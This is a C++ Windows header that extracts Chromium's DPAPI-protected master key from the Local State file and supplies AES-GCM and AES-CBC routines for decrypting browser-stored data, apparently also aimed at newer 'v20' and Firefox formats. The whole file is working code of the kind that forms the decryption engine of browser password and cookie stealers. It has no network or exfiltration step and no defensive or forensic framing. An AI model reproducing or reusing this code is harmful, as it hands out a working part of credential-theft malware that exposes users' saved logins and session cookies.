#ifndef CRYPTO_ENGINE_H
#define CRYPTO_ENGINE_H

#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <vector>
#include <string>
#include <fstream>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

namespace CryptoEngine {

    // ---------- DPAPI ----------
    inline std::string DecryptDPAPI(const std::vector<BYTE>& encrypted) {
        DATA_BLOB in{ static_cast<DWORD>(encrypted.size()),
                      const_cast<BYTE*>(encrypted.data()) };
        DATA_BLOB out{ 0, nullptr };
        if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
            std::string decrypted(reinterpret_cast<char*>(out.pbData), out.cbData);
            LocalFree(out.pbData);
            return decrypted;
        }
        return "";
    }

    inline std::wstring DecryptDPAPIW(const std::vector<BYTE>& encrypted) {
        DATA_BLOB in{ static_cast<DWORD>(encrypted.size()),
                      const_cast<BYTE*>(encrypted.data()) };
        DATA_BLOB out{ 0, nullptr };
        if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
            std::wstring decrypted(reinterpret_cast<wchar_t*>(out.pbData),
                                   out.cbData / sizeof(wchar_t));
            LocalFree(out.pbData);
            return decrypted;
        }
        return L"";
    }

    // ---------- Chromium master key ----------
    inline bool GetChromiumMasterKey(const std::wstring& localStatePath,
                                     std::vector<BYTE>& outMasterKey) {
        std::ifstream file(localStatePath.c_str());
        if (!file.is_open()) return false;

        std::string json((std::istreambuf_iterator<char>(file)),
                         std::istreambuf_iterator<char>());
        file.close();

        size_t pos = json.find("\"encrypted_key\":\"");
        if (pos == std::string::npos) return false;
        pos += 17;
        size_t endPos = json.find("\"", pos);
        std::string base64Key = json.substr(pos, endPos - pos);

        DWORD dwLen = 0;
        CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64,
                             NULL, &dwLen, NULL, NULL);
        std::vector<BYTE> enc(dwLen);
        CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64,
                             enc.data(), &dwLen, NULL, NULL);

        if (enc.size() < 5 ||
            std::string((char*)enc.data(), 5) != "DPAPI") {
            return false;
        }

        DATA_BLOB inBlob{ static_cast<DWORD>(enc.size() - 5), enc.data() + 5 };
        DATA_BLOB outBlob{ 0, nullptr };
        if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
            outMasterKey.assign(outBlob.pbData, outBlob.pbData + outBlob.cbData);
            LocalFree(outBlob.pbData);
            return true;
        }
        return false;
    }

    // ---------- AES-256-GCM ----------
    inline std::string DecryptAESGCM(const BYTE* ciphertext, DWORD ciphertextLen,
                                     const BYTE* iv, const BYTE* tag,
                                     const std::vector<BYTE>& masterKey) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        std::string plaintext;

        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
            return "";

        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                              (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                              sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return "";
        }

        DWORD cbKeyObject = 0, cbData = 0;
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                          (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
        std::vector<BYTE> keyObject(cbKeyObject);

        DWORD blobLen = sizeof(BCRYPT_KEY_DATA_BLOB_HEADER) +
                        static_cast<DWORD>(masterKey.size());
        std::vector<BYTE> keyBlob(blobLen);
        auto* hdr = reinterpret_cast<BCRYPT_KEY_DATA_BLOB_HEADER*>(keyBlob.data());
        hdr->dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
        hdr->dwVersion = BCRYPT_KEY_DATA_BLOB_VERSION1;
        hdr->cbKeyData = static_cast<DWORD>(masterKey.size());
        memcpy(keyBlob.data() + sizeof(BCRYPT_KEY_DATA_BLOB_HEADER),
               masterKey.data(), masterKey.size());

        if (BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey,
                            keyObject.data(), cbKeyObject,
                            keyBlob.data(), blobLen, 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return "";
        }

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = (PUCHAR)iv;
        authInfo.cbNonce = 12;
        authInfo.pbTag = (PUCHAR)tag;
        authInfo.cbTag = 16;

        DWORD cbPlain = 0;
        if (BCryptDecrypt(hKey, (PUCHAR)ciphertext, ciphertextLen, &authInfo,
                          NULL, 0, NULL, 0, &cbPlain, 0) == 0) {
            std::vector<BYTE> plain(cbPlain);
            if (BCryptDecrypt(hKey, (PUCHAR)ciphertext, ciphertextLen, &authInfo,
                              NULL, 0, plain.data(), cbPlain, &cbPlain, 0) == 0) {
                plaintext.assign(plain.begin(), plain.end());
            }
        }

        if (hKey) BCryptDestroyKey(hKey);
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
        return plaintext;
    }

    // ---------- AES-256-CBC (dla v20 / Firefox) ----------
    inline std::vector<BYTE> DecryptAESCBC(const BYTE* ciphertext, DWORD ctLen,
                                            const BYTE* iv,
                                            const std::vector<BYTE>& key) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        std::vector<BYTE> out;

        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
            return out;

        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                              (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                              sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return out;
        }

        DWORD cbKeyObject = 0, cbData = 0;
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                          (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
        std::vector<BYTE> keyObject(cbKeyObject);

        if (BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), cbKeyObject,
                                       (PUCHAR)key.data(),
                                       (ULONG)key.size(), 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return out;
        }

        std::vector<BYTE> ivCopy(iv, iv + 16);
        DWORD cbOut = 0;
        if (BCryptDecrypt(hKey, (PUCHAR)ciphertext, ctLen, NULL,
                          ivCopy.data(), 16, NULL, 0, &cbOut, 0) == 0) {
            out.resize(cbOut);
            // IV jest niszczony po pierwszym wywołaniu - kopiujemy ponownie
            std::vector<BYTE> ivCopy2(iv, iv + 16);
            BCryptDecrypt(hKey, (PUCHAR)ciphertext, ctLen, NULL,
                          ivCopy2.data(), 16, out.data(), cbOut, &cbOut, 0);
            out.resize(cbOut);
        }

        if (hKey) BCryptDestroyKey(hKey);
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
        return out;
    }
}

#endif